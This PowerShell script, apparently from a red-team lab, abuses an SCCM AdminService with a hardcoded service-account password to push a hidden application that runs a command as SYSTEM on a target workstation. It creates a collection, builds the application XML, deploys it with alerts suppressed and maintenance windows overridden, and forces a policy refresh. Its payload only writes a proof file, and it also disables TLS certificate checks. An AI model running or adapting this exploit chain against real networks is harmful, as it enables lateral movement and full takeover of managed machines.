# WT038: SCCM Application Deployment as SYSTEM on WS01 — replicates SCCMHunter SMSAPPLICATION flow
# analyst_t1 (ws01 ATTACK) — via AdminService wmi passthrough as range\svc_sccm
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy16 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy16

$mp = 'mbr02.range.local'
$targetResource = 16777220   # WS01
$cred = New-Object System.Management.Automation.PSCredential('range\svc_sccm', (ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))
$base = "https://$mp/AdminService"
$siteCode = 'CAD'
$appName = 'WT038-PROOF-' + [guid]::NewGuid().ToString('N').Substring(0,8)
$runas = 'System'
# Payload command run on the client as SYSTEM
$payload = "cmd /c `"whoami > C:\Windows\Temp\wt038-system.txt & echo WT038-PROOF-APP-DEPLOY > C:\Windows\Temp\wt038-marker.txt`""

function Invoke-AS($method, $path, $bodyJson) {
  $u = "$base/$path"
  try {
    if ($bodyJson) { $r = Invoke-RestMethod -Uri $u -Method $method -Body $bodyJson -ContentType 'application/json' -Credential $cred -TimeoutSec 30 }
    else { $r = Invoke-RestMethod -Uri $u -Method $method -Credential $cred -TimeoutSec 30 }
    return @{ ok = $true; data = $r }
  } catch {
    $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
    return @{ ok = $false; code = $code; err = $_.Exception.Message; detail = $_.ErrorDetails.Message }
  }
}

Write-Output "=== WT038 app deploy: $appName on WS01 ($targetResource) as SYSTEM ==="

# 1. Site ID -> scope ID
Write-Output '[1] GetSiteID'
$sid = Invoke-AS 'GET' "wmi/SMS_Identification.GetSiteID" $null
if (-not $sid.ok) { Write-Output ("  FAIL " + $sid.code); exit 1 }
$siteID = $sid.data.SiteID -replace '[{}]',''
$scopeID = "ScopeId_$siteID"
Write-Output ("  SiteID=" + $siteID + " scopeID=" + $scopeID)

# 2. Validate resource
Write-Output '[2] Validate resource SMS_R_System(16777220)'
$vr = Invoke-AS 'GET' "wmi/SMS_R_System($targetResource)" $null
if (-not $vr.ok) { Write-Output ("  FAIL " + $vr.code); exit 1 }
Write-Output ("  resource OK: " + $vr.data.Name)

# 3. Create collection + add member
$collName = "wt038_" + [guid]::NewGuid().ToString('N').Substring(0,8)
Write-Output ('[3] Create collection ' + $collName)
$cb = @{ Name = $collName; LimitToCollectionID = 'SMS00001'; Comment = ''; CollectionType = 2 } | ConvertTo-Json
$cr = Invoke-AS 'POST' 'wmi/SMS_Collection' $cb
if (-not $cr.ok) { Write-Output ("  FAIL " + $cr.code + " : " + $cr.detail); exit 1 }
$collId = $cr.data.CollectionID
Write-Output ("  CollectionID=" + $collId)

Write-Output '[4] Add WS01 to collection (AddMembershipRule)'
$mb = @{ collectionRule = @{ '@odata.type' = '#AdminService.SMS_CollectionRuleDirect'; ResourceClassName = 'SMS_R_System'; RuleName = "rule_$targetResource"; ResourceID = $targetResource } } | ConvertTo-Json -Depth 5
$mr = Invoke-AS 'POST' "wmi/SMS_Collection('$collId')/AdminService.AddMembershipRule" $mb
if (-not $mr.ok) { Write-Output ("  FAIL " + $mr.code + " : " + $mr.detail); exit 1 }
Write-Output '  member rule added'

# wait for membership
$inColl = $false
for ($i=1; $i -le 10; $i++) {
  Start-Sleep -Seconds 5
  $cm = Invoke-AS 'GET' ("wmi/SMS_FullCollectionMembership?`$filter=CollectionID eq '$collId'") $null
  if ($cm.ok -and $cm.data.value.Count -gt 0) { $inColl = $true; Write-Output ("  member visible (attempt $i)"); break }
}
if (-not $inColl) { Write-Output '  [!] membership not visible after wait — continuing anyway' }

# 5. Build AppMgmtDigest XML + create application
$appID = "Application_" + [guid]::NewGuid().ToString('N')
$deployID = "DeploymentType_" + [guid]::NewGuid().ToString('N')
$fileID = "File_" + [guid]::NewGuid().ToString('N')
Write-Output '[5] Build SDMPackageXML + create application'
$methodBody = @"
&lt;?xml version="1.0" encoding="utf-16"?&gt;&lt;EnhancedDetectionMethod xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;&lt;Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;&lt;File Is64Bit="true" LogicalName="$fileID" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"&gt;&lt;Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;&lt;DisplayName Text=""/&gt;&lt;Description Text=""/&gt;&lt;/Annotation&gt;&lt;Path&gt;C:\&lt;/Path&gt;&lt;Filter&gt;asdf&lt;/Filter&gt;&lt;/File&gt;&lt;/Settings&gt;&lt;Rule id="$scopeID/$deployID" Severity="Informational" NonCompliantWhenSettingIsNotFound="false" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;&lt;Annotation&gt;&lt;DisplayName Text=""/&gt;&lt;Description Text=""/&gt;&lt;/Annotation&gt;&lt;Expression&gt;&lt;Operator&gt;NotEquals&lt;/Operator&gt;&lt;Operands&gt;&lt;SettingReference AuthoringScopeId="$scopeID" LogicalName="$fileID" Version="1" DataType="Int64" SettingLogicalName="$fileID" SettingSourceType="File" Method="Count" Changeable="false"/&gt;&lt;ConstantValue Value="0" DataType="Int64"/&gt;&lt;/Operands&gt;&lt;/Expression&gt;&lt;/Rule&gt;&lt;/EnhancedDetectionMethod&gt;
"@
$xml = @"
<?xml version="1.0" encoding="utf-16"?>
<AppMgmtDigest xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <Application AuthoringScopeId="$scopeID" LogicalName="$appID" Version="1">
    <DisplayInfo DefaultLanguage="en-US"><Info Language="en-US"><Title>$appName</Title><Publisher/><Version/></Info><Description/></DisplayInfo>
    <DeploymentTypes><DeploymentType AuthoringScopeId="$scopeID" LogicalName="$deployID" Version="1"/></DeploymentTypes>
    <Title ResourceId="Res_665624387">$appName</Title>
    <Description ResourceId="Res_215018014"/><Publisher ResourceId="Res_433133800"/><SoftwareVersion ResourceId="Res_486536226"/><CustomId ResourceId="Res_167409166"/>
  </Application>
  <DeploymentType AuthoringScopeId="$scopeID" LogicalName="$deployID" Version="1">
    <Title ResourceId="Res_1643586251">$appName</Title>
    <Description ResourceId="Res_1438196005"/>
    <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
    <Technology>Script</Technology><Hosting>Native</Hosting>
    <Installer Technology="Script">
      <InstallAction><Provider>Script</Provider><Args>
        <Arg Name="InstallCommandLine" Type="String">$payload</Arg>
        <Arg Name="WorkingDirectory" Type="String"></Arg>
        <Arg Name="ExecutionContext" Type="String">$runas</Arg>
        <Arg Name="RequiresLogOn" Type="String"/>
        <Arg Name="RequiresElevatedRights" Type="Boolean">false</Arg>
        <Arg Name="RequiresUserInteraction" Type="Boolean">false</Arg>
        <Arg Name="RequiresReboot" Type="Boolean">false</Arg>
        <Arg Name="UserInteractionMode" Type="String">Hidden</Arg>
        <Arg Name="PostInstallBehavior" Type="String">BasedOnExitCode</Arg>
        <Arg Name="ExecuteTime" Type="Int32">0</Arg>
        <Arg Name="MaxExecuteTime" Type="Int32">15</Arg>
        <Arg Name="RunAs32Bit" Type="Boolean">false</Arg>
        <Arg Name="SuccessExitCodes" Type="Int32[]"><Item>0</Item><Item>1707</Item></Arg>
        <Arg Name="RebootExitCodes" Type="Int32[]"><Item>3010</Item></Arg>
        <Arg Name="HardRebootExitCodes" Type="Int32[]"><Item>1641</Item></Arg>
        <Arg Name="FastRetryExitCodes" Type="Int32[]"><Item>1618</Item></Arg>
      </Args></InstallAction>
      <DetectAction><Provider>Local</Provider><Args>
        <Arg Name="ExecutionContext" Type="String">$runas</Arg>
        <Arg Name="MethodBody" Type="String">$methodBody</Arg>
      </Args></DetectAction>
      <UninstallSetting>SameAsInstall</UninstallSetting>
      <InstallFolder/><UninstallCommandLine/><UninstallFolder/>
      <MaxExecuteTime>15</MaxExecuteTime>
      <ExitCodes><ExitCode Code="0" Class="Success"/><ExitCode Code="1707" Class="Success"/><ExitCode Code="3010" Class="SoftReboot"/><ExitCode Code="1641" Class="HardReboot"/><ExitCode Code="1618" Class="FastRetry"/></ExitCodes>
      <UserInteractionMode>Hidden</UserInteractionMode>
      <AllowUninstall>true</AllowUninstall>
    </Installer>
  </DeploymentType>
</AppMgmtDigest>
"@
$ab = @{ SDMPackageXML = $xml; IsHidden = $true } | ConvertTo-Json
$ar = Invoke-AS 'POST' 'wmi/SMS_Application' $ab
if (-not $ar.ok) { Write-Output ("  FAIL " + $ar.code + " : " + $ar.detail); exit 1 }
$ciId = $ar.data.CI_ID
Write-Output ("  Application CI_ID=" + $ciId)

# 6. Create deployment (SMS_ApplicationAssignment)
Write-Output '[6] Create deployment (SMS_ApplicationAssignment)'
$now = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$deployName = "$appName`_$collId`_Install"
$db = @{
  ApplicationName = $appName; AssignmentName = $deployName; AssignmentAction = 2
  AssignedCIs = @([int]$ciId); AssignmentType = 2; CollectionName = $collName
  DesiredConfigType = 1; DisableMomAlerts = $true; EnforcementDeadline = $now
  LogComplianceToWinEvent = $false; NotifyUser = $false; OfferFlags = 1
  OverrideServiceWindows = $true; Priority = 2; RebootOutsideOfServiceWindows = $false
  SoftDeadlineEnabled = $true; SourceSite = $siteCode; StartTime = $now
  SuppressReboot = 0; TargetCollectionID = $collId; UseGMTTimes = $true
  UserUIExperience = $false; WoLEnabled = $false
} | ConvertTo-Json
$dr = Invoke-AS 'POST' 'wmi/SMS_ApplicationAssignment' $db
if (-not $dr.ok) { Write-Output ("  FAIL " + $dr.code + " : " + $dr.detail); exit 1 }
$assignmentId = $dr.data.AssignmentID
Write-Output ("  AssignmentID=" + $assignmentId)

# 7. Force policy update on the collection
Write-Output '[7] Force policy update (InitiateClientOperation Type=8)'
$pb = @{ Type = 8; TargetCollectionID = $collId } | ConvertTo-Json
$pr = Invoke-AS 'POST' 'wmi/SMS_ClientOperation.InitiateClientOperation' $pb
if ($pr.ok) { Write-Output '  policy update triggered' } else { Write-Output ("  note: " + $pr.code) }

Write-Output ("WT038_DEPLOYED app=" + $appName + " ci=" + $ciId + " coll=" + $collId + " assignment=" + $assignmentId)
Write-Output ("WT038_VARS appName=" + $appName + " collId=" + $collId + " ciId=" + $ciId + " assignmentId=" + $assignmentId)
